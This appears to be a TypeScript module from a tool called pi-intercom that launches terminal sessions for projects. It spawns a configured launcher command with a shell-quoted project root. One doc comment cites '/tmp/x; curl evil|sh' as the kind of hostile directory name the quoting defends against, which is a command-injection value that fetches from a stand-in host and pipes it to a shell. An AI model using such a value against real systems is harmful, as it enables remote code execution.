import { spawn, type ChildProcess } from "child_process";
import { realpathSync, statSync } from "fs";
import { resolve } from "path";
import { sameCwd } from "./cwd.ts";
import type { SessionInfo } from "./types.ts";

const DEFAULT_PROJECT_AGENT_TIMEOUT_MS = 20_000;
const DEFAULT_PROJECT_AGENT_POLL_MS = 250;
/**
 * A launch command that exits non-zero within this window failed to start.
 * Commands that keep running (a blocking terminal launcher) or exit later
 * are treated as successful; pi-intercom never manages their lifetime.
 */
const LAUNCH_COMMAND_FAILURE_WINDOW_MS = 1_000;
const LAUNCH_COMMAND_MAX_LENGTH = 1024;

/**
 * Generic project-launch integration.
 *
 * pi-intercom never depends on a specific terminal manager. Any live
 * intercom session -- Herdr, FlightDeck, a tmux helper, or anything else --
 * registers as a project-launch provider by advertising this extension
 * capability namespace, then answers launch requests delivered as ordinary
 * intercom messages. Machines without a live provider can configure a
 * default launch command (PI_INTERCOM_PROJECT_LAUNCHER or config
 * "projectLauncher"); there is no built-in default.
 */
export const PROJECT_LAUNCH_NAMESPACE = "pi-intercom/project-launch-v1";

export const PROJECT_LAUNCH_REQUEST_TYPE = "pi-intercom/project-launch-request";

export interface ProjectLaunchRequest {
  type: typeof PROJECT_LAUNCH_REQUEST_TYPE;
  /** Absolute project root the terminal should open in. */
  root: string;
  /** Command to run inside the terminal (normally "pi"). */
  command: string;
  /** Whether the new terminal should receive focus when supported. */
  focus: boolean;
}

export interface ProjectPaneLaunch {
  projectRoot: string;
  provider:
    | { kind: "session"; sessionId: string; name: string }
    | { kind: "command"; command: string };
}

export interface ProjectTargetResolution {
  kind: "found" | "missing";
  session?: SessionInfo;
  targetCwd: string;
  reason?: string;
}

export interface ListSessionsClient {
  listSessions(options?: { timeoutMs?: number }): Promise<SessionInfo[]>;
}

export type LaunchCommandSpawn = (commandLine: string, options: {
  shell: true;
  windowsHide: true;
  cwd: string;
  env: NodeJS.ProcessEnv;
  detached: boolean;
}) => ChildProcess;

/**
 * Encodes the provider request contract. Providers parse incoming messages
 * with {@link parseProjectLaunchRequest} and act on them; anything that is
 * not a valid request is left alone as an ordinary message.
 */
export function projectLaunchRequestText(request: ProjectLaunchRequest): string {
  return JSON.stringify(request);
}

export function parseProjectLaunchRequest(text: string): ProjectLaunchRequest | undefined {
  try {
    const parsed: unknown = JSON.parse(text);
    if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return undefined;
    const record = parsed as Record<string, unknown>;
    if (record.type !== PROJECT_LAUNCH_REQUEST_TYPE) return undefined;
    if (typeof record.root !== "string" || !record.root.trim()) return undefined;
    if (typeof record.command !== "string" || !record.command.trim()) return undefined;
    if (typeof record.focus !== "boolean") return undefined;
    return {
      type: PROJECT_LAUNCH_REQUEST_TYPE,
      root: record.root,
      command: record.command,
      focus: record.focus,
    };
  } catch {
    return undefined;
  }
}

/**
 * Picks the project-launch provider deterministically: the longest-running
 * visible session advertising the namespace, tie-broken by session id. The
 * requester's own session never provides its own launch.
 */
export function findProjectLaunchProvider(sessions: readonly SessionInfo[], currentSessionId: string): SessionInfo | undefined {
  return sessions
    .filter((candidate) => candidate.id !== currentSessionId
      // Federation v1 does not carry capabilities across links; a remote row
      // must never be picked as a local project-launch provider.
      && candidate.federation === undefined
      && candidate.extensions?.some((extension) => extension.namespace === PROJECT_LAUNCH_NAMESPACE))
    .sort((left, right) => (left.startedAt ?? 0) - (right.startedAt ?? 0) || left.id.localeCompare(right.id))[0];
}

export function resolveProjectLauncherCommand(
  env: NodeJS.ProcessEnv = process.env,
  configured?: string,
): string | undefined {
  const fromEnv = env.PI_INTERCOM_PROJECT_LAUNCHER?.trim();
  if (fromEnv) return fromEnv;
  const fromConfig = configured?.trim();
  return fromConfig ? fromConfig : undefined;
}

function shellQuotePath(value: string): string {
  if (process.platform === "win32") return `"${value.replaceAll('"', '\\"')}"`;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

/**
 * Runs the configured default launch command. `{root}` is substituted with a
 * safely shell-quoted project root — write it bare (pi-intercom adds the
 * quoting), so a hostile directory name like "/tmp/x; curl evil|sh" can never
 * break out of the argument. The unquoted root is exported as
 * PI_INTERCOM_PROJECT_ROOT for commands that need it verbatim. The command
 * runs in the project root, detached, and pi-intercom does not manage or wait
 * for the terminal it creates.
 */
export async function launchProjectCommand(
  command: string,
  root: string,
  options: { signal?: AbortSignal; spawnImpl?: LaunchCommandSpawn; failureWindowMs?: number } = {},
): Promise<void> {
  if (!command.trim()) throw new Error("Project launcher command must not be empty.");
  if (command.length > LAUNCH_COMMAND_MAX_LENGTH) {
    throw new Error(`Project launcher command must be at most ${LAUNCH_COMMAND_MAX_LENGTH} characters.`);
  }
  const commandLine = command.replaceAll("{root}", shellQuotePath(root));
  const spawnImpl = options.spawnImpl ?? spawn;
  await new Promise<void>((resolveLaunch, rejectLaunch) => {
    let child: ChildProcess;
    let settled = false;
    const windowMs = options.failureWindowMs ?? LAUNCH_COMMAND_FAILURE_WINDOW_MS;
    try {
      child = spawnImpl(commandLine, {
        shell: true,
        windowsHide: true,
        cwd: root,
        env: { ...process.env, PI_INTERCOM_PROJECT_ROOT: root },
        detached: true,
      });
    } catch (cause) {
      rejectLaunch(new Error(`Failed to start the project launcher: ${cause instanceof Error ? cause.message : String(cause)}`));
      return;
    }
    const finish = (error?: Error): void => {
      if (settled) return;
      settled = true;
      clearTimeout(window);
      options.signal?.removeEventListener("abort", onAbort);
      error ? rejectLaunch(error) : resolveLaunch();
    };
    const onAbort = () => {
      try { child.kill(); } catch { /* already gone */ }
      finish(new Error("Project launcher command was aborted."));
    };
    const window = setTimeout(() => finish(), windowMs);
    window.unref?.();
    if (options.signal?.aborted) {
      onAbort();
      return;
    }
    options.signal?.addEventListener("abort", onAbort, { once: true });
    child.on("error", (cause) => finish(new Error(`Project launcher command failed to start: ${cause.message}`)));
    // Only an early non-zero exit is treated as a launch failure; a command
    // that is still running after the window (or exited zero) launched fine.
    child.on("close", (exitCode) => {
      if (exitCode != null && exitCode !== 0) {
        finish(new Error(`Project launcher command exited with code ${exitCode}.`));
        return;
      }
      finish();
    });
  });
}

export function resolveTargetInCwd(input: {
  sessions: SessionInfo[];
  currentSessionId: string;
  targetCwd: string;
  to?: string;
}): ProjectTargetResolution {
  const inCwd = input.sessions.filter((session) => sameCwd(session.cwd, input.targetCwd));
  const target = input.to?.trim();

  if (!target) {
    const candidates = inCwd.filter((session) => session.id !== input.currentSessionId);
    if (candidates.length === 1) {
      return { kind: "found", session: candidates[0], targetCwd: input.targetCwd };
    }
    if (candidates.length === 0) {
      return { kind: "missing", targetCwd: input.targetCwd, reason: `No other intercom sessions are connected in ${input.targetCwd}.` };
    }
    throw new Error(`Multiple intercom sessions are connected in ${input.targetCwd}: ${formatSessionRefs(candidates)}. Specify 'to'.`);
  }

  const byId = inCwd.find((session) => session.id === target);
  if (byId) return { kind: "found", session: byId, targetCwd: input.targetCwd };

  const lowerName = target.toLowerCase();
  const byName = inCwd.filter((session) => session.name?.toLowerCase() === lowerName);
  if (byName.length === 1) return { kind: "found", session: byName[0], targetCwd: input.targetCwd };
  if (byName.length > 1) {
    throw new Error(`Multiple intercom sessions named "${target}" are connected in ${input.targetCwd}: ${formatSessionRefs(byName)}. Address one by session ID.`);
  }

  const byIdPrefix = inCwd.filter((session) => session.id.startsWith(target));
  if (byIdPrefix.length === 1) return { kind: "found", session: byIdPrefix[0], targetCwd: input.targetCwd };
  if (byIdPrefix.length > 1) {
    throw new Error(`Multiple intercom sessions in ${input.targetCwd} match ID prefix "${target}". Use a longer session ID prefix.`);
  }

  return { kind: "missing", targetCwd: input.targetCwd, reason: `No intercom session matching "${target}" is connected in ${input.targetCwd}.` };
}

/**
 * Launches a Pi session in a project through whatever generic provider is
 * available: first a live mesh session advertising the project-launch
 * namespace, then a configured default launch command. Registration on the
 * intercom roster -- not any provider reply -- is what completes the launch.
 */
export async function openProjectPane(input: {
  cwd: string;
  focus?: boolean;
  sessions: readonly SessionInfo[];
  currentSessionId: string;
  launcherCommand?: string;
  sendRequest: (provider: SessionInfo, request: ProjectLaunchRequest) => Promise<{ delivered: boolean; reason?: string }>;
  signal?: AbortSignal;
  spawnImpl?: LaunchCommandSpawn;
}): Promise<ProjectPaneLaunch> {
  const projectRoot = resolveProjectRoot(input.cwd);
  const command = process.env.PI_INTERCOM_PI_BIN?.trim() || process.env.PI_BIN?.trim() || "pi";
  const provider = findProjectLaunchProvider(input.sessions, input.currentSessionId);
  if (provider) {
    const request: ProjectLaunchRequest = {
      type: PROJECT_LAUNCH_REQUEST_TYPE,
      root: projectRoot,
      command,
      focus: input.focus !== false,
    };
    const sent = await input.sendRequest(provider, request);
    if (!sent.delivered) {
      throw new Error(`Failed to request a project terminal from ${provider.name ?? provider.id}: ${sent.reason ?? "the message was not delivered."}`);
    }
    return {
      projectRoot,
      provider: { kind: "session", sessionId: provider.id, name: provider.name ?? provider.id },
    };
  }
  if (input.launcherCommand) {
    await launchProjectCommand(input.launcherCommand, projectRoot, { signal: input.signal, spawnImpl: input.spawnImpl });
    return { projectRoot, provider: { kind: "command", command: input.launcherCommand } };
  }
  throw new Error(
    "No project launcher is available. A terminal manager can register as a provider by advertising the "
    + `"${PROJECT_LAUNCH_NAMESPACE}" extension capability and answering its launch requests, or set a default `
    + "launcher with PI_INTERCOM_PROJECT_LAUNCHER (or config \"projectLauncher\"), for example "
    + "'tmux new-window -c \"{root}\" pi'.",
  );
}

export async function waitForProjectSession(client: ListSessionsClient, input: {
  projectRoot: string;
  currentSessionId: string;
  beforeSessionIds: ReadonlySet<string>;
  to?: string;
  signal?: AbortSignal;
  timeoutMs?: number;
  pollMs?: number;
}): Promise<SessionInfo> {
  const startedAt = Date.now();
  const timeoutMs = input.timeoutMs ?? DEFAULT_PROJECT_AGENT_TIMEOUT_MS;
  const pollMs = input.pollMs ?? DEFAULT_PROJECT_AGENT_POLL_MS;

  while (Date.now() - startedAt < timeoutMs) {
    if (input.signal?.aborted) throw new Error("Cancelled");
    const sessions = await client.listSessions({ timeoutMs: Math.min(5_000, timeoutMs) });

    if (input.to?.trim()) {
      const resolved = resolveTargetInCwd({
        sessions,
        currentSessionId: input.currentSessionId,
        targetCwd: input.projectRoot,
        to: input.to,
      });
      if (resolved.kind === "found" && resolved.session) return resolved.session;
      await sleep(pollMs, input.signal);
      continue;
    }

    const newInProject = sessions.filter(
      (session) => !input.beforeSessionIds.has(session.id) && sameCwd(session.cwd, input.projectRoot),
    );
    if (newInProject.length === 1) return newInProject[0]!;
    if (newInProject.length > 1) {
      throw new Error(`Multiple new intercom sessions registered in ${input.projectRoot}: ${formatSessionRefs(newInProject)}. Address one explicitly.`);
    }

    await sleep(pollMs, input.signal);
  }

  throw new Error(`Timed out waiting for a Pi intercom session to register in ${input.projectRoot}. The project launcher may still be starting, or pi-intercom may not be loaded there.`);
}

function resolveProjectRoot(cwd: string): string {
  const resolved = resolve(cwd);
  const stat = statSync(resolved);
  if (!stat.isDirectory()) {
    throw new Error(`Project target '${resolved}' is not a directory.`);
  }
  return realpathSync(resolved);
}

function formatSessionRefs(sessions: SessionInfo[]): string {
  return sessions
    .map((session) => `${session.name || "Unnamed session"} (${session.id.slice(0, 8)})`)
    .join(", ");
}

function sleep(ms: number, signal?: AbortSignal): Promise<void> {
  return new Promise((resolveSleep, reject) => {
    if (signal?.aborted) {
      reject(new Error("Cancelled"));
      return;
    }
    let timer: NodeJS.Timeout;
    const cleanup = () => signal?.removeEventListener("abort", onAbort);
    const onAbort = () => {
      clearTimeout(timer);
      cleanup();
      reject(new Error("Cancelled"));
    };
    timer = setTimeout(() => {
      cleanup();
      resolveSleep();
    }, ms);
    timer.unref?.();
    signal?.addEventListener("abort", onAbort, { once: true });
  });
}
